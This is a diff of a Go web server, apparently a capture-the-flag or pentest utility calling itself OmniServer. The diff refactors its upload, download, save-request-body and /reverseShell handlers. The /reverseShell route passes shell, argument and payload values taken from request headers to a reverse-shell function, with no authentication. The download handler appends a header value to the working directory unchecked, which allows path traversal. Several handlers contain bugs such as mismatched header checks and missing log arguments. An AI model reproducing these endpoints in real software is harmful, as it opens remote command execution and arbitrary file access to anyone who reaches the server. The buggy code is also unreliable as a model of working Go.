@@ -4,6 +4,7 @@ import (
 	"context"
 	"flag"
 	"fmt"
+	"io"
 	"log"
 	"mime"
 	"net"
@@ -17,32 +18,37 @@ import (
 	"time"
 )
 
-func downloadFileHandler(w http.ResponseWriter, r *http.Request) {
-	var requestedFile string
-	wd, err := os.Getwd()
-	checkError(err, 0)
-	if r.Method != http.MethodGet {
-		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
-	}
-	r.Header.Add("File", "")
-
-	if r.Header.Get("File") != "" {
-		requestedFile = r.Header.Get("File")
-	} else {
-		err := fmt.Errorf("Empty File Header for downloadFileHandler from ...")
+func downloadFileHandler() http.HandlerFunc {
+	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		var requestedFile string
+		wd, err := os.Getwd()
 		checkError(err, 0)
-	}
-	pathToRequestedFile := wd + requestedFile
-	exists, err := checkFileExists(pathToRequestedFile)
-	checkError(err, 0)
-	if !exists {
-		http.NotFound(w, r)
-		defer log.Printf("Failed to Download file: %v from %v - requested by: %v, %v, %v\n", requestedFile, requestedURL, clientIP, clientMAC, clientUA)
-	} else {
-		// fs, err := http.ServerFileFS(w,r,  )
-		defer log.Printf("Downloading file at: %v from: %v - requested by: %v, %v, %v\n", requestedFile, requestedURL, clientIP, clientMAC, clientUA)
-	}
-	log.Printf("Successfully Downloaded File - %v by %v - %v ; Started: %v and Ended %v\n", requestedFile, clientIP, clientMAC)
+		if r.Method != http.MethodGet {
+			http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
+			err := fmt.Errorf("Incorrect method used %s for /downloadFileHandler", r.Method)
+			checkError(err, 0)
+			return
+		}
+		r.Header.Add("File", "")
+
+		if r.Header.Get("File") != "" {
+			requestedFile = r.Header.Get("File")
+		} else {
+			err := fmt.Errorf("Empty File Header for downloadFileHandler from ...")
+			checkError(err, 0)
+		}
+		pathToRequestedFile := wd + requestedFile
+		exists, err := checkFileExists(pathToRequestedFile)
+		checkError(err, 0)
+		if !exists {
+			http.NotFound(w, r)
+			defer log.Printf("Failed to Download file: %v from %v - requested by: %v, %v, %v\n", requestedFile, requestedURL, clientIP, clientMAC, clientUA)
+		} else {
+			// fs, err := http.ServerFileFS(w,r,  )
+			defer log.Printf("Downloading file at: %v from: %v - requested by: %v, %v, %v\n", requestedFile, requestedURL, clientIP, clientMAC, clientUA)
+		}
+		log.Printf("Successfully Downloaded File - %v by %v - %v ; Started: %v and Ended %v\n", requestedFile, clientIP, clientMAC)
+	})
 }
 
 func lsTmpDir() {
@@ -76,38 +82,41 @@ func sha256AFile(filepath string) (result string, err error) {
 	return result, nil
 }
 
-func reverseShellHandler(w http.ResponseWriter, r *http.Request) {
-	var shell, args, payload string
-	if r.Method != http.MethodPost {
-		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
-	}
-	if r.Method != http.MethodPost {
-		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
-	}
-	r.Header.Add("Shell", "")
-	r.Header.Add("Args", "")
-	r.Header.Add("Payload", "")
+func reverseShellHandler() http.HandlerFunc {
+	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		var shell, args, payload string
+		if r.Method != http.MethodPost {
+			http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
+			err := fmt.Errorf("Incorrect method used %s for /reverseShellHandler", r.Method)
+			checkError(err, 0)
+			return
+		}
 
-	if r.Header.Get("Shell") != "" {
-		shell = r.Header.Get("Shell")
-	} else {
-		err := fmt.Errorf("Empty Shell Header for reverseShellHandler from ...")
+		r.Header.Add("Shell", "")
+		r.Header.Add("Args", "")
+		r.Header.Add("Payload", "")
+
+		if r.Header.Get("Shell") != "" {
+			shell = r.Header.Get("Shell")
+		} else {
+			err := fmt.Errorf("Empty Shell Header for reverseShellHandler from ...")
+			checkError(err, 0)
+		}
+		if r.Header.Get("File") != "" {
+			args = r.Header.Get("Args")
+		} else {
+			err := fmt.Errorf("Empty Args Header for reverseShellHandler from ...")
+			checkError(err, 0)
+		}
+		if r.Header.Get("File") != "" {
+			payload = r.Header.Get("Payload")
+		} else {
+			err := fmt.Errorf("Empty Payload Header for reverseShellHandler from ...")
+			checkError(err, 0)
+		}
+		err := reverseShell(shell, args, payload)
 		checkError(err, 0)
-	}
-	if r.Header.Get("File") != "" {
-		args = r.Header.Get("Args")
-	} else {
-		err := fmt.Errorf("Empty Args Header for reverseShellHandler from ...")
-		checkError(err, 0)
-	}
-	if r.Header.Get("File") != "" {
-		payload = r.Header.Get("Payload")
-	} else {
-		err := fmt.Errorf("Empty Payload Header for reverseShellHandler from ...")
-		checkError(err, 0)
-	}
-	err := reverseShell(shell, args, payload)
-	checkError(err, 0)
+	})
 }
 
 func reverseShell(shell, args, payload string) (err error) {
@@ -131,123 +140,133 @@ func reverseShell(shell, args, payload string) (err error) {
 }
 
 // TODO - Thinking about errors
-func uploadFileHandler(w http.ResponseWriter, r *http.Request) {
-	maxUploadSize := 10 * 1024 // 10 Mb
-	tmpDir := os.TempDir()
-	http.FileServer(http.Dir(tmpDir))
-	log.Printf("Temporary File server started at %s for uploading files\n", tmpDir)
+func uploadFileHandler() http.HandlerFunc {
+	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		var maxUploadSize int64 = 10 * 1024 // 10 Mb
+		tmpDir := os.TempDir()
+		wd, err := os.Getwd()
+		checkError(err, 0)
+		http.FileServer(http.Dir(tmpDir))
+		log.Printf("Temporary File server started at %s for uploading files\n", tmpDir)
 
-	fileType := r.PostFormValue("type")
-	filename := r.PostFormValue("filename")
+		if r.Method != http.MethodPost {
+			http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
+			err := fmt.Errorf("Incorrect method used %s for /uploadFileHandler", r.Method)
+			checkError(err, 0)
+			return
+		}
 
-	r.Header.Add()
-	// publicKey Header
-	//fileSize :=
-	//mimeHeader :=
+		file, fileHeader, err := r.FormFile("filename")
+		checkError(err, 0)
+		log.Printf("/tmp/%s - Upload requested by ...\n")
+		defer file.Close()
 
-	if r.Method != http.MethodPost {
-		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
-	}
-	fileEndings, err := mime.ExtensionsByType(detectedFileType)
-	if err != nil {
-		//renderError(w, "CANT_READ_FILE_TYPE", http.StatusInternalServerError)
-	}
-	log.Printf("FileType: %s, File: %s\n", detectedFileType, newPath)
-	if err := r.ParseMultipartForm(maxUploadSize); err != nil {
-		log.Printf("Could not parse multipart form: %v\n", err)
-		//renderError(w, "CANT_PARSE_FORM", http.StatusInternalServerError) // DO I want to send errors out - compile flags!
-	}
-	//log.Print("",  ) File upload request success
-	//log.Print("",  ) File upload INFO:
-	log.Printf("Uploaded File: %+v\n", filename)
-	log.Printf("File Size: %+v\n", fileSize)
-	log.Printf("MIME Header: %+v\n", mimeHeader)
-	//log.Print("",  ) File upload request success
+		fileSize := fileHeader.Size
+		log.Printf("File size (bytes): %v\n", fileSize)
+		if fileSize > maxUploadSize {
+			writerRespondError(w, "FILE_TOO_LARGE", http.StatusBadRequest)
+		}
 
-	uploadFileArgs := "temporarystring"
+		fileBytes, err := io.ReadAll(file)
+		checkError(err, 0)
 
-	file, fileHeader, err := r.FormFile(uploadFileArgs)
-	if err != nil {
-		//renderError(w, "INVALID_FILE", http.StatusBadRequest)
-	}
-	log.Printf("/upload/%s - Upload requested by ...\n")
-	defer file.Close()
-	fileSize := fileHeader.Size
-	log.Printf("File size (bytes): %v\n", fileSize)
-	if fileSize > maxUploadSize {
-		//renderError(w, "FILE_TOO_BIG", http.StatusBadRequest)
-	}
-	detectedFileType := http.DetectContentType(fileBytes)
-	switch detectedFileType {
-	case "", "":
-		log.Printf("No file type detected by Go STDLIB http.DetectContentType - first 512 bytes parsed")
-		log.Printf("This section is here in case of modification based of requiring specific file types")
-		break
-	default:
-		log.Printf("The detected file type by OmniServer's use of go's http.DetectContentType was: %s", detectedFileType)
-		//renderError(w, "INVALID_FILE_TYPE", http.StatusBadRequest)
-	}
+		detectedFileType := http.DetectContentType(fileBytes)
+		switch detectedFileType {
+		case "/", "":
+			log.Printf("No file type detected by Go STDLIB http.DetectContentType - first 512 bytes parsed")
+			log.Printf("This section is here in case of modification based of requiring specific file types")
+			break
+		default:
+			log.Printf("The detected file type by OmniServer's use of go's http.DetectContentType was: %s", detectedFileType)
+			writerRespondError(w, "INVALID_FILE_TYPE", http.StatusBadRequest)
+		}
 
-	// Create a temporary file tmp directory that conforms to a naming scheme
-	tempFile, err := os.CreateTemp(tmpDir, "tmp-")
-	checkError(err, 0)
-	defer tempFile.Close()
-	defer os.Remove(tempFile.Name())
-	log.Printf("Successfully Uploaded File - %s \n", tempFile.Name())
+		fileEndings, err := mime.ExtensionsByType(detectedFileType)
+		if err != nil {
+			log.Printf("mime.ExtensionsByType() cannot read %s", fileEndings)
+			writerRespondError(w, "CANT_READ_FILE_TYPE", http.StatusInternalServerError)
+		}
+		log.Printf("FileType: %s, File: %s\n", detectedFileType)
+		if err := r.ParseMultipartForm(maxUploadSize); err != nil {
+			log.Printf("Could not parse multipart form: %v\n", err)
+			writerRespondError(w, "CANT_PARSE_FORM", http.StatusInternalServerError) // DO I want to send errors out - compile flags!
+		}
+		log.Print("File upload request successfully made by: ")
+		log.Printf("Uploaded File: %+v\n", fileHeader.Filename)
+		log.Printf("File Size: %+v\n", fileSize)
+		log.Printf("MIME Header: %+v\n", fileEndings)
 
-	// Write to the temporary file
-	// Reasons for writing to another file is that we can then can byte parser code here to parse the file for something CTFy...
-	// sha256 hashing for the file also adds a layer of checks regarding packet skull hole-pokery that prevent worms to prevent file compromise
-	currTmpFile := tmpDir + tempFile.Name()
-	fileBytes, err := os.ReadFile(currTmpFile)
-	checkError(err, 0)
-	wd, err := os.Getwd()
-	checkError(err, 0)
-	hashedFilename, err := sha256AFile(currTmpFile) //
-	checkError(err, 0)
-	log.Printf("Coverting from temporary to regular File - %s to %s - a SHA256\n", tempFile.Name(), hashedFilename)
-	wdAndFilename := wd + hashedFilename
-	err = os.WriteFile(wdAndFilename, fileBytes, 611)
-	checkError(err, 0)
+		// Create a temporary file tmp directory that conforms to a naming scheme
+		log.Printf("File upload to temporary file creation started\n")
+		tempFile, err := os.CreateTemp(tmpDir, "tmp-")
+		checkError(err, 0)
+		defer tempFile.Close()
+		defer os.Remove(tempFile.Name())
+		log.Printf("Successfully uploaded file as a temporary file to %s - %s \n", tmpDir, tempFile.Name())
 
-	defer log.Printf("Successfully saved uploaded temporary file: %s to %s\n", currTmpFile, wdAndFilename)
-	defer log.Printf("Successfully removed temporary file: %s\n", currTmpFile)
-	defer lsTmpDir()
+		// Reasons for writing to another file is that we can then can byte parser code here to parse the file for something CTFy...
+		// sha256 hashing for the file also adds a layer of checks regarding packet skull hole-pokery that prevent worms to prevent file compromise
+		log.Printf("Attempting to SHA256 hash the file %s/%s and store it the currect working directory of OmniServer - %s \n", tmpDir, tempFile.Name(), wd)
+		currTmpFile := tmpDir + tempFile.Name()
+		fileBytes, err = os.ReadFile(currTmpFile)
+		checkError(err, 0)
+		hashedFilename, err := sha256AFile(currTmpFile) //
+		checkError(err, 0)
+		log.Printf("Successfully hashed %s as %s\n", tempFile.Name(), hashedFilename)
+		log.Printf("Coverting from temporary to regular File - %s to %s - a SHA256\n", tempFile.Name(), hashedFilename)
+		wdAndFilename := wd + hashedFilename
+		err = os.WriteFile(wdAndFilename, fileBytes, 611)
+		checkError(err, 0)
+		exists, err := checkFileExists(wdAndFilename)
+		checkError(err, 0)
+		if !exists {
+			err := fmt.Errorf("Uploaded file does not exist in the work directory as filepath %s", wdAndFilename)
+			checkError(err, 0)
+		}
+		defer log.Printf("Successfully saved uploaded temporary file: %s to %s\n", currTmpFile, wdAndFilename)
+		defer log.Printf("Successfully removed temporary file: %s\n", currTmpFile)
+		defer lsTmpDir()
+	})
 }
 
-func saveReqBodyFileHandler(w http.ResponseWriter, r *http.Request) {
-	if r.Method != http.MethodPost {
-		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
-	}
-	tmpDir := os.TempDir()
-	http.FileServer(http.Dir(tmpDir))
-	log.Printf("Temporary File server started at %s for uploading files\n", tmpDir)
-	r.Body = http.MaxBytesReader(w, r.Body, 1048576)
-	tempFile, err := os.CreateTemp(tmpDir, "tmp-")
-	checkError(err, 0)
-	defer tempFile.Close()
-	defer os.Remove(tempFile.Name())
-	log.Printf("Successfully Saved Request Body to File - %s \n", tempFile.Name())
-	fullTempFilePath := tmpDir + tempFile.Name()
-	hashedFilename, err := sha256AFile(fullTempFilePath)
-	checkError(err, 0)
-	wd, err := os.Getwd()
-	checkError(err, 0)
-	fullPathWithExt := wd + hashedFilename + ".req"
-	checkError(err, 0)
-	fileBytes, err := os.ReadFile(fullTempFilePath)
-	checkError(err, 0)
-	err = os.WriteFile(fullPathWithExt, fileBytes, 611)
-	checkError(err, 0)
-	defer log.Println("Saved Request Body to a finalize hashed filename at %s", fullPathWithExt)
+func saveReqBodyFileHandler() http.HandlerFunc {
+	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		if r.Method != http.MethodPost {
+			http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
+			err := fmt.Errorf("Incorrect method used %s for /saveReqBodyFileHandler", r.Method)
+			checkError(err, 0)
+			return
+		}
+		tmpDir := os.TempDir()
+		http.FileServer(http.Dir(tmpDir))
+		log.Printf("Temporary File server started at %s for uploading files\n", tmpDir)
+		r.Body = http.MaxBytesReader(w, r.Body, 1048576)
+		tempFile, err := os.CreateTemp(tmpDir, "tmp-")
+		checkError(err, 0)
+		defer tempFile.Close()
+		defer os.Remove(tempFile.Name())
+		log.Printf("Successfully Saved Request Body to File - %s \n", tempFile.Name())
+		fullTempFilePath := tmpDir + tempFile.Name()
+		hashedFilename, err := sha256AFile(fullTempFilePath)
+		checkError(err, 0)
+		wd, err := os.Getwd()
+		checkError(err, 0)
+		fullPathWithExt := wd + hashedFilename + ".req"
+		checkError(err, 0)
+		fileBytes, err := os.ReadFile(fullTempFilePath)
+		checkError(err, 0)
+		err = os.WriteFile(fullPathWithExt, fileBytes, 611)
+		checkError(err, 0)
+		defer log.Println("Saved Request Body to a finalize hashed filename at %s", fullPathWithExt)
+	})
 }
 
 func createDefaultWebServerMux() *http.ServeMux {
 	mux := http.NewServeMux()
-	mux.HandleFunc("/upload", uploadFileHandler)
-	mux.HandleFunc("/download", downloadFileHandler)
-	mux.HandleFunc("/saveReqBody", saveReqBodyFileHandler)
-	mux.HandleFunc("/reverseShell", reverseShellHandler)
+	mux.HandleFunc("/upload", uploadFileHandler())
+	mux.HandleFunc("/download", downloadFileHandler())
+	mux.HandleFunc("/saveReqBody", saveReqBodyFileHandler())
+	mux.HandleFunc("/reverseShell", reverseShellHandler())
 	return mux
 }
 
@@ -311,6 +330,12 @@ func checkError(err error, errorCode int) {
 	if err != nil {
 		log.Fatal(err, " - Error code: ", errorCode)
 	}
+}
+
+// renderError factorisation from - https://github.com/zupzup/golang-http-file-upload-download/blob/main/main.go
+func writerRespondError(w http.ResponseWriter, message string, statusCode int) {
+	w.WriteHeader(statusCode)
+	w.Write([]byte(message))
 }
 
 // TODO This is not connected to the design - fix
